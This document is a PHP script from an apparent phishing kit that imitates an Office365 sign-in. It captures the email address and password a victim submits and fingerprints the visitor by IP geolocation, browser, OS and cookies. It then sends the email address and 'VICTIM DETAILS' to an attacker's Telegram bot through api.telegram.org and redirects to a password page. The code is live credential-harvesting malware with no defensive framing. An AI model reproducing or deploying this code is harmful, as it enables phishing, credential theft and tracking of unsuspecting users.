<?php
session_start();
# Fucntions

function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }

            }
        }
        return $time_zone;
    }
    return 'unknown';
}

$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

# Variables

$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];

$details2 = get_ip2($IP);
$details2 = json_decode($details2);
$isp = $details2->{'isp'};
$lat = $details2->{'lat'};
$lon = $details2->{'lon'};
$ip_type = $details2->{'ipType'};
$ip_name = $details2->{'ipName'};
$region = $details2->{'region'};


if($countryname == "") {
    $details = get_ip2($IP);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}


$hostname = gethostbyaddr($IP);
$IPV6 = "N/A ❌";

$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);
$client = file_get_contents("../client.txt");
if(empty($cpu)){
    $cpu = "N/A ❌";
}
if(empty($hostname)){
    $hostname = "N/A ❌";
}
$mode = $_COOKIE['private_mode'];
if($mode == "true"){
    $mode = "Private Browser 🕵🏻";
} else if ($mode == "false"){
    $mode = "Default Browser ✅";
}
$dateT = explode(' ',$_COOKIE['time']);
$time = $dateT[4];
$exact = null;
foreach(array_slice($dateT, 5, 9) as $k){$exact.=$k." ";}

if($_COOKIE['is_mobile'] == "1"){
    $mobile = "Yes ✅";
    $phone = $_COOKIE['phone'];
} else {
    $mobile = "No ❌";
    $phone = "N/A ❌";
}
if($_COOKIE['is_tablet'] == "1"){
    $tablet = "Yes ✅";
} else {
    $tablet = "No ❌";
}
if($_COOKIE['phone'] == "0"){
    $tablet = "N/A ❌";
}

###End###


$email = $_SESSION['email'] = $_POST['email'];
$password = $_SESSION['password'] = $_POST['password'];
include('Telegram.php');
$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");
if(isset($_POST['email'])){
	$message .= '
=========🍁 ‹OFFICE365 | New Email Address | From '.$ip.'› 🍁=========
[EMAIL ADDRESS] = '.$_POST['email'].'
[Date & Time] ='.$InfoDATE.'
[IP Address] = '.$ip.'
=========🍁Private Page By : itna1337™🍁=========
';
$message .= "********** [ 🌐 BROWSER DETAILS 🌐 ] **********\n";
$message .= "# USERAGENT  : {$useragent}\n";
$message .= "# BROWSER    : {$browser}\n";
$message .= "# OS         : {$os}\n";
$message .= "********** [ 👤 VICTIM DETAILS 👤 ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# CITY(IP)   : {$city}\n";
$message .= "# TIMEZONE   : {$timezone}, {$exact}\n";
$message .= "# COUNTRY    : {$countryname}, {$countrycode}\n";
$message .= "# DATE       : {$date}\n";
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
//$file = fopen('ID.txt', 'a');
//fwrite($file,$message);
    header("location: ../pass.php");
    exit();
}
?>